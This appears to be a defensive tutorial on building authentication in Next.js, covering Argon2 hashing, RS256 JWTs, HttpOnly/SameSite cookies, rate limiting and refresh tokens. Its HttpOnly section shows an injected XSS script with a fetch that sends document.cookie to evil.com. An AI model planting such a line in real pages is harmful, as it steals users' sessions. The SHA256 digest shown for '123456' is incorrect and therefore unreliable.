## One: Passwords. No, Hashing Is Not Enough.

### Plaintext Is a Disaster Waiting to Happen

Look at this. Do not actually run this. Just imagine it:

```sql
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)  -- plaintext. are you serious
);
```

You run this. Users sign up. Passwords go straight into the database. Everything works. Then one day, the database gets stolen — maybe there was a SQL injection you missed, maybe the server got shelled, maybe a third-party service leaked a backup. It does not matter how. The result is the same: every user's password is now public.

Your users reuse passwords. This is human nature. You cannot educate it away with a blog post about password managers. Your database leaks, the attacker takes those username-password combos and tries them on Taobao, WeChat, every bank — you know what happens next.

Holy shit.

So you cannot store plaintext. But what do you store?

### Hashing: The Digital Paper Shredder

You walk into an office, feed a stack of paper into a shredder, press the button. Out comes a pile of strips. You cannot tell what the original document said. But — if you shred the same document with the same shredder, the strips look exactly the same every time.

**A hash function is that shredder.**

```
"123456" + SHA256 → e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89a1b08eecf880ee9a6d8
"123456" + SHA256 → e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89a1b08eecf880ee9a6d8
```

Same input, same output, always. Reverse it? Impossible — just like reconstructing the original document from the shredded strips.

So you store the hash. When a user logs in, you hash their input, compare it with the database, and if they match, you let them in.

Sounds perfect. But there is a catch: you and your neighbor both use SHA256, and your passwords both happen to be `123456`. The hash values in your database? Identical. An attacker sees two identical hashes and knows immediately: these two people share the same password. If the attacker's rainbow table already contains SHA256("123456"), boom — both accounts cracked.

### Salting: Seasoning Each Dish Differently

You run a restaurant. Everyone orders the same dish — braised pork belly. If you cook it the same way for everyone, every plate tastes identical. But now you add a personal touch: chili flakes for table 3, fermented black beans for table 7, Thai basil for table 12. Same dish, completely different flavors.

**Salt is that personal touch.**

```typescript
const salt = crypto.randomBytes(16).toString('hex') // e.g. "a3f7b2c9..."
const hash = sha256(password + salt) // "123456" + "a3f7b2c9..." = totally different
```

Each user gets a random salt. Even if two users pick the same password, their hashes end up completely different. The attacker now has to crack each hash individually — cost goes from N to N × each unique salt.

Still not enough. Some hash functions are way too fast.

### MD5: Death by Speed

MD5 is from the 1990s. It was designed to be fast — because it was meant for file integrity checks, and fast was good. But for password storage? **Fast is a death sentence.**

Modern GPUs — an RTX 4090, for instance — can compute billions of MD5 hashes per second. An attacker builds a dictionary of common passwords, pre-computes all the MD5 hashes (this is called a rainbow table), and when your database leaks, they do not even need to compute — they just look up the matches. Seconds. Done.

**MD5 with salt in 2026 is effectively unencrypted.** Do not use it. If someone tells you MD5 is fine, send them this article and tell them to read it three times.

```sql
-- This might have been acceptable in 2005. In 2026 it is suicide.
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password_hash VARCHAR(32),  -- MD5
    salt VARCHAR(16)
);
```

### bcrypt: The Deliberately Slow Lock

bcrypt has one idea: **be slow.**

Imagine your front door lock takes a full second to open. For you? One second is nothing. For a burglar trying to pick locks on a million houses? One second × a million doors = game over.

bcrypt is that deliberately slow lock. It has a parameter called the cost factor. Set it to 12, and each hash takes about 250 milliseconds. A user signing up waits 250ms — they do not notice. An attacker trying to brute-force? Four attempts per second instead of four billion.

```typescript
const hash = await bcrypt.hash(password, 12)
// Output format: $2b$12$(22-char-salt).(31-char-hash)
// The salt is baked into the output. No separate column needed.
```

bcrypt also naturally resists GPUs — its algorithm involves lots of memory access patterns that GPU parallel architectures handle poorly.

But bcrypt has limits. It relies primarily on time cost, offering limited protection against dedicated hardware (ASICs). And the memory usage is relatively fixed — you cannot dial it up flexibly.

### Argon2: Three-Dimensional Defense

In 2015, the cryptography community held a competition — the Password Hashing Competition. The winner was an algorithm called Argon2. Its core idea: **make it hard across three dimensions simultaneously, so no single piece of hardware can brute-force its way through.**

| Parameter   | What It Means   | Why It Matters                            |
| ----------- | --------------- | ----------------------------------------- |
| memoryCost  | Memory usage    | GPUs and ASICs hit memory bandwidth walls |
| timeCost    | Iteration count | Each extra round doubles the time cost    |
| parallelism | Thread count    | Caps how many threads you can throw at it |

bcrypt makes one lock slow. Argon2 reinforces the lock, the door frame, and the wall.

```typescript
import { hash, verify, argon2id } from 'argon2'

async function hashPassword(password: string): Promise<string> {
  return await hash(password, {
    type: argon2id, // Hybrid mode — best balance
    memoryCost: 65536, // 64 MB memory
    timeCost: 3, // 3 iterations
    parallelism: 4, // 4 threads
    hashLength: 32,
  })
}
```

Argon2 has three variants:

- `argon2d`: Maximum GPU resistance, but theoretically vulnerable to side-channel attacks (power analysis).
- `argon2i`: Maximum side-channel resistance, weaker against GPUs.
- `argon2id` (recommended): Hybrid. For everyday use — you are not an arms dealer, nobody is bringing power analysis to your side project.

### The Evolution at a Glance

| Algorithm | Era   | Strategy      | Anti-GPU | Anti-ASIC | Tuneable     | Verdict        |
| --------- | ----- | ------------- | -------- | --------- | ------------ | -------------- |
| MD5+salt  | 1990s | Fast hash     | None     | None      | Fixed        | Never use      |
| bcrypt    | 1999  | Time cost     | Moderate | Limited   | Time         | Fine, not best |
| Argon2    | 2015  | Memory + time | Strong   | Strong    | 3 dimensions | First choice   |

### What to Use in Production

**New project?** Argon2. Do not hesitate. Nobody gets to say "Argon2 is too new" — it won the competition a decade ago and the libraries are mature.

**Existing bcrypt system?** Migration is not mandatory. bcrypt is not broken. But new features should use Argon2. You can migrate gradually — new users get Argon2, existing users get re-hashed on their next login.

**What Argon2 does NOT solve:** If your user's password is `password123`, God himself cannot save you. Argon2 protects reasonably strong passwords from brute-force. It does not make weak passwords strong. Garbage in, garbage out.

## Two: JWT. How Do You Prove You Are You?

### After Login, How Does the Server Remember?

Alright. You figured out password storage. Users sign up and log in. You verify the password. You let them in. Then what?

The user clicks a button. The browser sends a brand new HTTP request to your server. HTTP is stateless — this request has no idea who sent the last one. You need a mechanism so every subsequent request can say "I am the person who logged in five minutes ago."

Two paths.

### Option One: Sessions (Traditional Stateful Login)

You walk into a fancy restaurant. The host gives you a coat check ticket. A small numbered slip. You go to your table, order food, ask for the bill — the waiter asks for your ticket number, checks the system: yes, this guest is here.

That is a **Session.**

```
User logs in → Server generates Session ID = "abc123" → sends it to browser (usually as a Cookie)
Every subsequent request → Browser sends the Session ID → Server looks it up: "abc123 = Max, let him through"
```

Sessions are simple. The server has full control — you want to kick someone out? Delete their session row. The downside: the server has to store state. Ten servers? User logs in on server A, next request hits server B — server B has no idea what "abc123" is. You need shared session storage (Redis, etc.), and that is an operational headache.

### Option Two: JWT (Carry Your Own ID)

You are at a train station. The ticket inspector does not call headquarters to ask "who is this person?" You pull out your ID card. The inspector checks — photo matches, hologram is real, official seal is there. Done. You are through.

That is a **JWT (JSON Web Token).**

```
User logs in → Server signs a Token → sends it to browser
Every subsequent request → Browser sends the Token → Server verifies the signature → reads user info from the Token
```

No lookup table. No shared state. The Token carries user information. The only job on the server side: verify "was this Token signed by me, and has anyone tampered with it?"

### What a JWT Looks Like

Three segments, separated by dots. Like this:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoibWF4In0.d1a2b3c4d5e6f7g8h9i0...
    ↑ Header                     ↑ Payload                     ↑ Signature
```

**Header:** Which algorithm signed this? (`{"alg": "RS256"}`)

**Payload:** User info. (`{"userId": "123", "name": "max"}`)

**Signature:** A cryptographic signature over the first two segments. Change a single character in the Token and the signature no longer matches.

Critical reminder: **the Payload is NOT encrypted.** It is Base64-encoded. Base64 is encoding, not encryption. Anyone can decode it. Never put passwords, social security numbers, or credit card numbers in a JWT payload. That is basically posting them on a billboard.

### HS256 vs RS256?

JWT supports two families of algorithms:

**Symmetric (HS256):** Same key signs and verifies. Like your house key — the same key locks and unlocks. Fast, but in a distributed system, every server that needs to verify tokens must hold this key. The exposure surface multiplies with every server.

**Asymmetric (RS256):** Private key signs, public key verifies. Like your handwritten signature — only you can sign, but anyone can check your handwriting. You can hardcode the public key in the frontend. It leaks? Who cares — it can only verify, not sign.

**For production, use RS256.** No debate.

```typescript
import { SignJWT, jwtVerify } from 'jose'

// Sign with private key
const token = await new SignJWT({ userId: '123', name: 'max' })
  .setProtectedHeader({ alg: 'RS256' })
  .setIssuedAt()
  .setExpirationTime('7d')
  .sign(privateKey)

// Verify with public key
const { payload } = await jwtVerify(token, publicKey)
// payload = { userId: '123', name: 'max' }
```

### Three Problems with JWT You Cannot Ignore

JWTs sound great. Here is what they do not tell you.

**Problem One: Token Leakage**

The Token lives in the browser. If an XSS attack grabs it, or you are on public WiFi and someone does a man-in-the-middle — the attacker is now you. They can do anything you can do until the Token expires.

And here is the worst part: **the server cannot force a JWT to stop working.** JWTs are stateless — the server stores nothing, so there is nothing to "revoke." Expiry is the only failure mode.

The fix? Two-token refresh mechanism. But the principle is simple: never let a single Token live too long.

**Problem Two: Token Bloat**

Every request carries the entire JWT. If you stuff the payload — user permissions list, recent browsing history, avatar URL — every HTTP request bloats by hundreds of bytes, multiplied by 20 API calls per page load.

Payload: keep it to userId and name. Nothing else.

**Problem Three: Revocation Is a Lie**

JWT's design philosophy is "self-contained and stateless." But in production, you almost always need the ability to revoke — the user changed their password, the old Token must die. Your choices:

- Maintain a blocklist (violates the stateless ideal).
- Very short expiry + refresh mechanism (this is the right answer).

### What JWT Does NOT Solve

- JWT does **not** prevent XSS — the payload is plaintext readable in the browser.
- JWT does **not** prevent man-in-the-middle — you need HTTPS for that.
- JWT does **not** handle authorization — it proves "who you are," not "what you are allowed to do."

## Three: Cookies. How to Send Tokens Without Getting Robbed.

### Cookie vs LocalStorage

You signed a JWT. Now: how does the browser send it back on subsequent requests?

**Option A: Cookie.** The browser automatically attaches it to every request. Zero code.

**Option B: LocalStorage.** You manually add `Authorization: Bearer xxx` to every fetch.

|                | Cookie             | LocalStorage                               |
| -------------- | ------------------ | ------------------------------------------ |
| Auto-attached  | Yes                | No (manual)                                |
| JS-readable    | By default, yes    | By default, yes                            |
| XSS-resistant  | With HttpOnly: yes | **Cannot** (XSS reads localStorage freely) |
| CSRF-resistant | Needs SameSite     | Naturally immune                           |
| Best for       | Web apps           | SPA + separate API                         |

Pick your poison. Cookie + HttpOnly at least prevents XSS scripts from stealing the Token. CSRF can be mitigated with SameSite.

### HttpOnly: Wallet, Inside Pocket

You are at a crowded market. Wallet in your jacket's outer pocket or inside pocket?

Outer pocket: a pickpocket grabs it in half a second. Inside pocket: they need to unbutton your coat first — too conspicuous.

HttpOnly is that inside pocket. It is a Cookie attribute. Set it, and **JavaScript running in the browser cannot read this Cookie at all.**

```html
<!-- Malicious script injected into your page -->
<script>
  console.log(document.cookie)
  // If auth_token has HttpOnly,
  // this only sees non-HttpOnly cookies.
  // The auth token is invisible to JS.
  fetch('https://evil.com/steal?data=' + document.cookie)
</script>
```

XSS scripts cannot steal what they cannot read. It does not prevent XSS — it prevents XSS from also stealing your login. Defense in depth.

### SameSite: Only Show Your ID at Your Bank

You are on coffee shop WiFi. You logged into your online banking earlier — the session Cookie is still in your browser. You accidentally click a link that says "Claim your free Starbucks gift card." That link actually sends a transfer request to your bank.

Your browser, being helpful, automatically attaches the Cookie. The bank sees the Cookie — "oh, this person is logged in" — and processes the transfer. Money gone.

This is **CSRF (Cross-Site Request Forgery).** And holy fuck, is it real.

SameSite exists to fix this. It tells the browser: only send this Cookie under certain conditions.

| SameSite Value | Behavior                                                                                  |
| -------------- | ----------------------------------------------------------------------------------------- |
| `strict`       | Only send Cookie on same-site requests (external links? no Cookie)                        |
| `lax`          | Same-site + navigational GET requests from external links (POST from external? no Cookie) |
| `none`         | Send on everything (must also set `Secure`)                                               |

`strict` is most secure, but the UX can be annoying — a user clicks your link from Twitter, arrives with no Cookie, and sees "Please log in." They were literally just logged in. It feels broken. Most sites use `lax` as a compromise.

### The Complete Cookie Configuration

```typescript
import { cookies } from 'next/headers'

const cookieStore = await cookies()

cookieStore.set('auth_token', token, {
  httpOnly: true, // Anti-XSS
  secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
  sameSite: 'lax', // Anti-CSRF
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/', // Whole site
})
```

Three attributes. All required:

- `httpOnly: true` → Without this, your Token is one injected `<script>` away from being stolen.
- `sameSite: 'lax'` → Without this, you log into your bank, click a link, and your money is gone.
- `secure: true` → Without this, the guy on the coffee shop WiFi reads your Cookie in plaintext.

## Four: The Full Flow — Signup to Signout

Enough theory. Let us wire everything together.

### Signup

```typescript
import { hash, argon2id } from 'argon2'
import { z } from 'zod'

const registerSchema = z.object({
  name: z
    .string()
    .min(2, 'Username must be at least 2 characters')
    .max(50)
    .regex(/^[a-zA-Z0-9_]+$/, 'Letters, numbers, underscores only'),
  password: z
    .string()
    .min(8, 'Password must be at least 8 characters')
    .max(128)
    .regex(/[A-Z]/, 'Must contain an uppercase letter')
    .regex(/[a-z]/, 'Must contain a lowercase letter')
    .regex(/[0-9]/, 'Must contain a number'),
})

async function register(name: string, password: string) {
  // 1. Validate input — Zod does runtime checks
  const result = registerSchema.safeParse({ name, password })
  if (!result.success) {
    return { code: -1, message: result.error.errors[0].message }
  }

  // 2. Check for duplicates
  const exists = await prisma.user.findFirst({ where: { name } })
  if (exists) {
    return { code: -1, message: 'Username already taken' }
  }

  // 3. Hash with Argon2
  const hashedPassword = await hash(password, {
    type: argon2id,
    memoryCost: 65536,
    timeCost: 3,
    parallelism: 4,
    hashLength: 32,
  })

  // 4. Store only the hash. Never the plaintext.
  await prisma.user.create({
    data: { name, password: hashedPassword },
  })

  return { code: 0, message: 'Signup successful' }
}
```

### Login

Login adds one step beyond signup: after verifying the password, sign a JWT and set a Cookie.

```typescript
async function login(name: string, password: string) {
  // 1. Find the user
  const user = await prisma.user.findFirst({ where: { name } })
  if (!user) {
    // Note: do NOT say "user not found" vs "wrong password"
    return { code: -1, message: 'Invalid username or password' }
  }

  // 2. Verify the password — Argon2's verify handles salt automatically
  const isValid = await verify(user.password, password)
  if (!isValid) {
    return { code: -1, message: 'Invalid username or password' }
  }

  // 3. Sign the JWT
  const token = await new SignJWT({
    userId: user.id,
    name: user.name,
  })
    .setProtectedHeader({ alg: 'RS256' })
    .setExpirationTime('7d')
    .sign(privateKey)

  // 4. Set the Cookie
  const cookieStore = await cookies()
  cookieStore.set('auth_token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 60 * 60 * 24 * 7,
    path: '/',
  })

  return { code: 0, message: 'Login successful' }
}
```

Why "Invalid username or password" instead of telling them which one was wrong?

Because if you say "user not found" vs "wrong password," an attacker can test different usernames to discover which ones are registered. This is called user enumeration. Once they have a list of valid usernames, they target those with password attempts. Always return the same error message for both cases. Give away nothing.

### Check Current User

```typescript
async function getCurrentUser() {
  const cookieStore = await cookies()
  const token = cookieStore.get('auth_token')?.value

  if (!token) return null

  try {
    const { payload } = await jwtVerify(token, publicKey)
    return payload // { userId, name }
  } catch {
    return null // Expired or tampered
  }
}
```

### Signout

JWT's stateless nature creates a subtle awkwardness here: signing out just deletes the Cookie. The Token itself is still "alive." If someone intercepted it before you logged out, they can still use it until it expires.

```typescript
async function logout() {
  const cookieStore = await cookies()
  cookieStore.delete('auth_token')
  // The Token is still technically "valid" on the server...
  // The browser just will not send it anymore.
}
```

This problem — "the Token outlives the logout" — is exactly one of the reasons we need a refresh token mechanism.

## Five: One Pitfall in Next.js 15 — Server Actions Cannot Export Classes

Next.js 15 Server Actions have a restriction: `'use server'` files can only export plain functions, not classes or class instances.

This does not mean you abandon object-oriented design. Use a class internally, expose functions externally:

```typescript
// lib/auth-service.ts — internal, object-oriented
class AuthService {
  async register(name: string, password: string) {
    /* ... */
  }
  async login(name: string, password: string) {
    /* ... */
  }
  async logout() {
    /* ... */
  }
  async getCurrentUser() {
    /* ... */
  }
}

// lib/auth-actions.ts — external, functional
import { AuthService } from './auth-service'

const authService = new AuthService()

export async function register(formData: FormData) {
  const name = formData.get('name') as string
  const password = formData.get('password') as string
  return await authService.register(name, password)
}

export async function login(formData: FormData) {
  const name = formData.get('name') as string
  const password = formData.get('password') as string
  return await authService.login(name, password)
}

export async function logout() {
  return await authService.logout()
}
```

The beauty of this pattern: internal logic stays organized and testable. External API stays clean and conformant. Best of both worlds.

## Six: Frontend — A Hook to Manage Auth State

On the client side, you need to know "is the user logged in right now?" One custom hook is all it takes:

```typescript
function useAuth() {
  const [user, setUser] = useState<User | null>(null)
  const [loading, setLoading] = useState(true)

  const checkAuth = useCallback(async () => {
    setLoading(true)
    try {
      const userData = await fetchCurrentUser()
      setUser(userData)
    } catch {
      setUser(null)
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    checkAuth()
  }, [checkAuth])

  return {
    user,
    loading,
    isAuthenticated: user !== null,
    refresh: checkAuth,
  }
}
```

Using it in a page:

```tsx
function DashboardPage() {
  const { user, loading, isAuthenticated, refresh } = useAuth()

  if (loading) return <div>Loading...</div>
  if (!isAuthenticated) return <div>Please log in first</div>

  return (
    <div>
      <h1>Welcome back, {user.name}</h1>
      <button
        onClick={async () => {
          await logout()
          refresh()
        }}
      >
        Sign out
      </button>
    </div>
  )
}
```

## Seven: Three Patches You Must Apply

### Rate Limiting: The Bouncer

You walk up to a club. The bouncer stops you: "Three ID checks. Three fails, you are outside for an hour."

Rate limiting is that bouncer. It stops scripts from brute-forcing passwords.

```typescript
import { RateLimiter } from 'rate-limiter-flexible'

// Per IP
const ipLimiter = new RateLimiter({
  points: 10, // 10 attempts
  duration: 60, // per 60 seconds
  blockDuration: 300, // blocked for 5 minutes
})

// Per username — prevents locking someone else's account
const usernameLimiter = new RateLimiter({
  points: 5, // 5 attempts
  duration: 900, // per 15 minutes
  blockDuration: 900,
})

async function login(ip: string, name: string, password: string) {
  try {
    await ipLimiter.consume(ip)
  } catch {
    return { code: -1, message: 'Too many attempts. Try again later.' }
  }
  try {
    await usernameLimiter.consume(name)
  } catch {
    return { code: -1, message: 'Too many attempts on this account. Try in 15 minutes.' }
  }
  // ... normal login logic
}
```

### Audit Logging: The Security Camera

You are in a shopping mall. Cameras everywhere. When nothing happens, they silently record. When something happens, you pull the footage and see exactly what went down.

Audit logs are those cameras.

```typescript
async function createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
  await prisma.auditLog.create({
    data: {
      action, // 'LOGIN_SUCCESS' / 'LOGIN_FAILED' / 'REGISTER'
      userId,
      metadata, // { reason: 'wrong_password', ip: '...' }
      ipAddress: getClientIP(),
      userAgent: getUserAgent(),
    },
  })
}

// During login
async function login(name: string, password: string) {
  // ... verification logic ...
  if (!user) {
    await createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
    return { code: -1, message: 'Invalid username or password' }
  }
  if (!isValid) {
    await createAuditLog('LOGIN_FAILED', { reason: 'wrong_password', userId: user.id })
    return { code: -1, message: 'Invalid username or password' }
  }
  await createAuditLog('LOGIN_SUCCESS', { userId: user.id })
  // ...
}
```

Two principles for audit logs:

1. Record failures in detail — IP, reason, timestamp. You need the forensic trail.
2. If audit logging itself fails, do not block the business flow. Logging is a sidecar, not a gate.

### Input Validation: The Security Checkpoint

What if someone types SQL into your signup form? What if they inject `<script>alert(1)</script>`? What if the username field arrives with 2MB of data?

Zod on the server side is your security checkpoint. Frontend validation does not count — it is a UX convenience, not a security measure. Anyone can `curl` a POST request and bypass your form entirely.

```typescript
const loginSchema = z.object({
  name: z.string().min(1).max(50),
  password: z.string().min(6).max(100),
})

// First thing in every login function:
const result = loginSchema.safeParse({ name, password })
if (!result.success) {
  return { code: -1, message: result.error.errors[0].message }
}
```

Server-side validation. Always. No exceptions.

## Eight: Refresh Tokens — Solving JWT's Core Contradiction

### The Contradiction That Keeps You Awake

Back to JWT's biggest pain point.

Long-lived Token → if stolen, the attacker has a long window to do damage. You have basically handed them a vacation.

Short-lived Token → the user has to re-enter their password every 15 minutes. The experience is garbage.

How do you break this?

### The Answer: Two Tokens, Two Jobs

You join a gym. You get a membership card that has two parts:

1. **Entry wristband** (short-lived, 15 minutes): Gets you through the turnstile. Lose it? No big deal — it expires in 15 minutes.
2. **Membership card** (long-lived, 7 days): When your wristband is about to expire, you swipe this at the front desk and get a new wristband. Silent. Seamless.

In an auth system:

- **Access Token** = the wristband. 15 minutes. Used for every API request. If it leaks, the attack window is 15 minutes.
- **Refresh Token** = the membership card. 7 days. Used **only** when refreshing the Access Token. Rarely transmitted, rarely exposed. Leaked? You can revoke it.

```
User flow:
1. Login         → Server returns Access Token + Refresh Token
2. Normal use    → Carry the Access Token everywhere
3. Access expires → Silently use Refresh Token to get a new Access Token
4. Refresh expires → Too long since last visit. Log in again.
5. Sign out      → Server marks Refresh Token as revoked
```

### Three Approaches, One Winner

**Approach One: Stateful (Store in Database)**

Store the full Refresh Token in the database. Maximum control — revoke anytime, list user's devices, full audit trail. Downside: database dependency, query on every refresh.

**Approach Two: Stateless (Pure JWT)**

Refresh Token itself is a JWT. Zero database dependency. Fully stateless. Downside: cannot revoke. Once issued, it lives until expiry. User changes their password? Old Refresh Token is still valid. Think about that for a second.

**Approach Three: Hybrid (Metadata Only)** — **This is the right answer.**

The Refresh Token is still a JWT, but you store only its unique identifier (jti) and revocation status in the database. Not the full Token. You keep most of the stateless benefits while gaining revocation capability.

```prisma
model RefreshTokenMetadata {
  id        String   @id @default(cuid())
  jti       String   @unique    // Unique ID from the JWT
  userId    String
  expiresAt DateTime
  revoked   Boolean  @default(false)  // Set to true to revoke
  @@index([userId])
}
```

### Full Implementation

#### Issuing Access Token + Refresh Token

```typescript
// Access Token: 15-minute lifetime
async function generateAccessToken(userId: string, name: string) {
  return await new SignJWT({ userId, name, type: 'access' })
    .setProtectedHeader({ alg: 'RS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(accessTokenPrivateKey)
}

// Refresh Token: 7-day lifetime, with jti
async function generateRefreshToken(userId: string) {
  const jti = crypto.randomUUID()
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)

  // Store only metadata
  await prisma.refreshTokenMetadata.create({
    data: { jti, userId, expiresAt },
  })

  return await new SignJWT({ userId, jti, type: 'refresh' })
    .setProtectedHeader({ alg: 'RS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .setJti(jti)
    .sign(refreshTokenPrivateKey)
}
```

#### Verifying a Refresh Token

```typescript
async function verifyRefreshToken(token: string) {
  try {
    // 1. Verify JWT signature and expiry
    const { payload } = await jwtVerify(token, refreshTokenPublicKey)

    // 2. Check the database — has this jti been revoked?
    const metadata = await prisma.refreshTokenMetadata.findUnique({
      where: { jti: payload.jti as string },
    })

    if (!metadata || metadata.revoked) return { valid: false }
    if (metadata.expiresAt < new Date()) return { valid: false }

    return { valid: true, userId: payload.userId as string }
  } catch {
    return { valid: false }
  }
}
```

#### Refreshing the Access Token

```typescript
async function refreshAccessToken() {
  const cookieStore = await cookies()
  const refreshToken = cookieStore.get('refresh_token')?.value

  if (!refreshToken) return { success: false }

  const { valid, userId } = await verifyRefreshToken(refreshToken)
  if (!valid || !userId) return { success: false }

  const user = await prisma.user.findUnique({ where: { id: userId } })
  if (!user) return { success: false }

  const newAccessToken = await generateAccessToken(user.id, user.name)

  cookieStore.set('access_token', newAccessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 15 * 60,
    path: '/',
  })

  return { success: true }
}
```

#### Frontend Silent Refresh

The user should never know the Access Token expired. You do a silent refresh in the API client:

```typescript
class ApiClient {
  private isRefreshing = false

  async request(url: string, options: RequestInit = {}) {
    const headers = { 'Content-Type': 'application/json', ...options.headers }

    let response = await fetch(url, { ...options, headers })

    // On 401, silently try to refresh
    if (response.status === 401) {
      const refreshOk = await this.silentRefresh()
      if (refreshOk) {
        // Retry the original request with the new token
        response = await fetch(url, { ...options, headers })
      } else {
        // Refresh failed — redirect to login
        window.location.href = '/login'
        throw new Error('Authentication expired')
      }
    }

    if (!response.ok) throw new Error(`Request failed: ${response.status}`)
    return response.json()
  }

  private async silentRefresh(): Promise<boolean> {
    if (this.isRefreshing) {
      // Another request is already refreshing. Wait.
      return new Promise((resolve) => setTimeout(() => resolve(this.silentRefresh()), 100))
    }

    this.isRefreshing = true
    try {
      const res = await fetch('/api/auth/refresh', { method: 'POST' })
      return res.ok
    } finally {
      this.isRefreshing = false
    }
  }
}
```

Key detail: the `isRefreshing` lock. Ten API calls all hit 401 simultaneously. Without it, all ten would try to refresh at once. With it, only the first one issues the refresh request — the other nine wait.

#### Revoking on Signout

```typescript
async function logout() {
  const cookieStore = await cookies()
  const refreshToken = cookieStore.get('refresh_token')?.value

  if (refreshToken) {
    try {
      const { payload } = await jwtVerify(refreshToken, refreshTokenPublicKey)
      // Mark as revoked in the database
      await prisma.refreshTokenMetadata.update({
        where: { jti: payload.jti as string },
        data: { revoked: true },
      })
    } catch {
      // Token might already be expired. That is fine.
    }
  }

  cookieStore.delete('access_token')
  cookieStore.delete('refresh_token')
}
```

#### Different Cookie Paths

A detail that is easy to miss: the Access Token and Refresh Token should have different Cookie paths.

```typescript
// Access Token: path='/'  — sent on every request
cookieStore.set('access_token', accessToken, { path: '/' })

// Refresh Token: path='/api/auth/refresh'  — sent only to the refresh endpoint
cookieStore.set('refresh_token', refreshToken, {
  path: '/api/auth/refresh',
  maxAge: 7 * 24 * 60 * 60,
})
```

Why? Minimize the Refresh Token's exposure surface. Normal API requests only need the Access Token. Restricting the Refresh Token's path to the refresh endpoint means it is never transmitted in 99% of requests. The risk of leakage drops dramatically.

### Refresh Token Security Advantages

| Advantage               | Why It Matters                                                                   |
| ----------------------- | -------------------------------------------------------------------------------- |
| Minimized attack window | Access Token lives 15 minutes. Even if stolen, the damage is contained.          |
| Seamless UX             | Users never see a re-login prompt. Silent refresh feels invisible.               |
| Controllable revocation | You can mark any jti as revoked, instantly killing that session.                 |
| Multi-device management | Each device gets its own Refresh Token. Kick one device without touching others. |
| Fast incident response  | Detect a compromise? Revoke all of that user's Refresh Tokens in one query.      |

## Nine: How to Judge If Your Auth System Is Good Enough

I am not giving you a summary. Summaries are someone else thinking for you.

I am giving you a set of questions. Go through them against your own system.

**1. How are you storing passwords?**

- If someone dumped your database right now, would they see real passwords?
- If two users pick the same password, are their hashes identical?
- Are you using Argon2 or bcrypt? If it is MD5, stop reading and go fix it.

**2. How are you managing tokens?**

- How long is your Token expiry? Over an hour? Add a refresh mechanism.
- What signing algorithm? HS256? Consider RS256.
- What is in your Token payload? Phone numbers, passwords, ID numbers? Remove them immediately.

**3. Are your Cookies configured properly?**

- `httpOnly: true`? Set it.
- `sameSite: 'lax'` or `strict`? Set it.
- `secure: true` in production? Set it.
- Is the Refresh Token's Cookie path restricted to the refresh endpoint?

**4. Is anyone watching?**

- Are you logging failed login attempts?
- Do you have rate limiting? (10 attempts/minute/username is a bare minimum.)
- Are you monitoring anomalies — like one IP trying 50 different usernames?

**5. If a Token is stolen, what can you do?**

- Can you actively revoke it? (With refresh tokens: yes.)
- How quickly can you detect the theft? (Depends on your audit log granularity.)
- Can you revoke all devices at once? (One-click kick-out of all sessions.)

These five questions have no universal answers. Different applications have different requirements — a banking system and a personal blog live in different threat universes.

But if you find yourself thinking "I have never considered that question" for any of them — open your IDE and start patching.

Security is not a project with an end date. It is a continuous race against attackers who never stop. A good architecture means that when a new threat emerges, you add one new defense layer — you do not tear everything down and start over.

You just need one thing: **every auth event is logged, every Token is revocable, every attack path has someone watching.**

The rest is just getting back to sleep at 2 AM.
